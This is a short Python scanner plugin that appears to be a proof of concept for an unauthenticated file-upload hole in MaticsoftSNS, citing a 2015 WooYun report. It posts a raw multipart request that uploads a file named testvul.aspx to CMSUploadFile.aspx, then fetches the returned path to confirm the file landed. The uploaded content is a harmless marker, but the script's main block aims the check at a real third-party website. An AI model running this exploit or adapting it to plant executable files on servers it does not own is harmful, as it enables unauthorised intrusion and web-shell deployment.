#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0137397
#__Author__ = 上善若水
#_PlugName_ = MaticsoftSNS Plugin
#_FileName_ = MaticsoftSNS.py


import re


def assign(service, arg):
    if service == "maticsoftsns":
        return True, arg 	

def audit(arg):
    raw = '''
POST /CMSUploadFile.aspx HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------1280715097228
Content-Length: 229

-----------------------------1280715097228
Content-Disposition: form-data; name="upload"; filename="testvul.aspx"
Content-Type: application/octet-stream

testvul_uploadfile_test
-----------------------------1280715097228--
    '''
    url = arg + 'CMSUploadFile.aspx'
    # proxy=('127.0.0.1',1234)
    # code, head,res, errcode, _ = curl.curl2(url,proxy=proxy,raw=raw)
    code1, head1, res1, errcode1, _url1 = curl.curl2(url,raw=raw)
    shell_path = re.sub(r'1\||\{0\}','',res1)
    code2, head2, res2, errcode2, _url2 = curl.curl2(arg+shell_path)
    if code2 == 200 and 'testvul_uploadfile_test' in res2: 
        security_hole(url)
            
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('maticsoftsns', 'http://mall.66jyw.com/')[1])